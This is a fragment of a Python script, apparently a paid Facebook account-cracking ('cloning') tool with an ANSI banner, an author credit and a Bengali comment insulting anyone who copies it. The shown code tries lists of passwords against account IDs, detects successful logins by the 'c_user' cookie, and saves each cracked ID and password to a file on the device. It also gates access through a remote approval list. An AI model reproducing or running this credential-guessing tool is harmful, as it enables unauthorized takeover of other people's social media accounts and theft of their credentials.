...
#হালার পুত রা Sc copy কইরা নিজের নামে চালাই না Ok #####
...
\033[38;5;46m┌━━━━━━━━━━━━━━━━━━\033[33;1m⊱   ⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┐\033[33;1m ┫│\033[38;5;46mA\033[33;1m│┣
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘈𝘜𝘛𝘏𝘖𝘙      \033[1;97m  :  \033[34;1mAJMIR  \033[38;5;46m│ \033[33;1m┫│\033[38;5;46mJ\033[33;1m│┣
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘎𝘐𝘛𝘏𝘜𝘉        \033[1;97m:  \033[34;1m Ajmirhossain      \033[38;5;46m   │  \033[33;1m┗━┛
...
def Main():
	...
	print('[\033[1;37m00\33[1;92m][\033[1;93mE\33[1;92m] EXIT TOOL'S')
	print(54*'━')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/AJMIR-008.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Ajmirhosen000/FB-CLONING/blob/main/Approval.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        ...
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am B.D.A.J.ROBOT and my boss is Ajmir.Hossain.Sir this tool is paid because 100% ok id just now login\"")
